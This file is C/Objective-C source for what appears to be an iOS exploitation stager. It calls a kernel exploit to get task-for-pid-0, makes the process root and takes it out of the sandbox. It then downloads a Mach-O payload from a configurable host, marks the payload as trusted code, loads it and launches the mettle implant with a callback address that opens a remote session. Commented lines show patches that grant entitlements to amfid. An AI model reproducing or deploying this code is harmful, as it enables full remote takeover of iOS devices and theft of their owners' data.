#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

#include <mach/mach.h>

#include "common.h"

#import <Foundation/Foundation.h>

#import "empty_list.h"
#import "jelbrek.h"

#import <dlfcn.h>

#include <mach-o/dyld.h>

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define LOG(msg) \
  NSLog(@msg); \
  fprintf(stderr, msg); \
  fflush(stderr); \

int main() {
  LOG("Starting...\n");
  LOG("Starting...\n");
  LOG("Starting...\n");
  LOG("Starting...\n");
  LOG("Starting...\n");
  LOG("Starting...\n");
  LOG("Starting...\n");

  //NSLog(@"dlsym %p longjmp %p", (void*)dlsym, (void*)longjmp);
  //uint64_t* stack_check_guard = dlsym(RTLD_DEFAULT, "__stack_chk_guard");
  //NSLog(@"stack_check_guard %p longjmp %p", (void*)stack_check_guard, (void*)longjmp);
  //NSLog(@"dlsym %p longjmp %p", (void*)dlsym, (void*)_longjmp);
  //NSLog(@"dlsym %p _longjmp %p", (void*)dlsym("dlsym", 0), (void*)longjmp);
  //uint32_t c = _dyld_image_count();
  //for (uint32_t i = 0; i < c; i++) {
    //NSLog(@"im %u %p %p %s\n", i, (void*)_dyld_get_image_header(i), (void*)_dyld_get_image_vmaddr_slide(i), _dyld_get_image_name(i));
  //}
  //if (true) {
    //return 0;
  //}

  mach_port_t taskforpidzero = exploit();
  if (!MACH_PORT_VALID(taskforpidzero)) {
    LOG("Exploit failed...\n");
    sleep(1);
    return -1;
  }

  LOG("Got tfp0\n");

  init_jelbrek(taskforpidzero);

  LOG("Good init\n");

  pid_t pid = getpid();

  rootify(pid);
  LOG("got uid 0\n");

  FILE *f = fopen("/var/mobile/.roottest", "w");
  LOG("file!\n");
  if (f) {
    fclose(f);
  }

  uint64_t sb = unsandbox(pid);

  f = fopen("/var/mobile/.roottest", "w");
  if (f) {
    LOG("sb file!\n");
    fclose(f);
  }

  //setcsflags(pid); // set some csflags
  //platformize(pid); // set TF_PLATFORM
  //setHSP4();

  //char * met_path = "/var/mobile/mettle.dylib";
  //char * file_path = "/var/mobile/amfid_payload.dylib";
  char * file_path = "/var/mobile/mettl.dylib";
  unlink(file_path);
  LOG("Downloading payload\n");

  const char config_placeholder[1024] = "PAYLOAD_URL";

  // Load the payload from server
  int sockfd = 0;
  struct sockaddr_in serv_addr;
  const char *getpayload = "GET /payload HTTP/1.1\r\n\r\n";
  const int chunk_size = 4096;
  char* payload_buffer = malloc(chunk_size);
  if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
    LOG("Could not connect socket");
    return -1;
  }

  serv_addr.sin_family = AF_INET;
  serv_addr.sin_addr.s_addr = *(uint32_t*)config_placeholder;
  serv_addr.sin_port = *(uint16_t*)(config_placeholder + 4);

  LOG("Connecting...\n");
  if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
    LOG("Could not connect\n");
    return -1;
  }
  send(sockfd, getpayload, strlen(getpayload), 0);

  int payloadfd = open(file_path, O_WRONLY | O_CREAT, 0700);
  int read_header = 0;
  int n;
  while ((n = read(sockfd, payload_buffer, chunk_size)) > 0) {
    if (!read_header) {
      char * payload_start = (char*)memmem((unsigned char*)payload_buffer, chunk_size, (unsigned char*)"\xcf\xfa\xed\xfe", 4);
      write(payloadfd, payload_start, n - (payload_start - payload_buffer));
      read_header = 1;
    } else {
      write(payloadfd, payload_buffer, n);
    }
  }

  close(payloadfd);
  close(sockfd);
  free(payload_buffer);

  LOG("trust!\n");
  trustbin(file_path);
  //LOG("trust met!\n");
  //trustbin(met_path);

  // patch amfid
  //pid_t amfid = pid_of_procName("amfid");

  // entitle it
  //setcsflags(amfid);
  //entitlePidOnAMFI(amfid, "get-task-allow", true);
  //entitlePidOnAMFI(amfid, "com.apple.private.skip-library-validation", true);

  // entitle ourselves too
  //entitlePidOnAMFI(getpid(), "task_for_pid-allow", true);
  //entitlePidOnAMFI(getpid(), "com.apple.system-task-ports", true);

  LOG("inject!\n");
  fixMmap(file_path);
  LOG("fixed mmap!\n");
  void* mettle = dlopen(file_path, RTLD_NOW);
  if (mettle) {
    LOG("got mettle!\n");

    // Launch the payload
    typedef int (*main_ptr)(int argc, const char *argv[]);
    main_ptr main_func = dlsym(mettle, "main");
    if (main_func) {
      LOG("got main_func!\n");
      const char * progname = "mettle";
      const char * arg1 = "-u";
      //const char * arg2 = "tcp://192.168.43.176:4444";
      const char * arg2 = config_placeholder+6;
      const char *argv[] = { progname, arg1, arg2, NULL };
      int mainret = main_func(3, argv);
      LOG("did run main_func!\n");
    }
  }
  LOG("mettle!\n");
  LOG("mettle!\n");
  LOG("mettle!\n");
  LOG("mettle!\n");
  LOG("mettle!\n");
  LOG("mettle!\n");
  LOG("mettle!\n");
  LOG("mettle!\n");

  //Feb 10 23:48:23 iPhone-8 kernel(Sandbox)[0] <Error>: Sandbox: amfid(207) System Policy: deny(1) file-map-executable /private/var/mobile/mettle.dylib
  //Feb 10 23:48:23 iPhone-8 hellotest[206] <Notice>: Error is dlopen(/var/mobile/mettle.dylib, 0x0002): file system sandbox blocked mmap() of '/var/mobile/mettle.dylib'

  //fixMmap(met_path);
  //LOG("fixed mmap met!\n");
  //inject_dylib(amfid, met_path);
  LOG("sandbox!\n");

  if (sb) {
    sandbox(pid, sb);
  }

  LOG("exit!\n");
  exit(0);
  LOG("exit lol!\n");


  return 0;
}


uint64_t entry[] = { MAGIC, (uint64_t)&main };
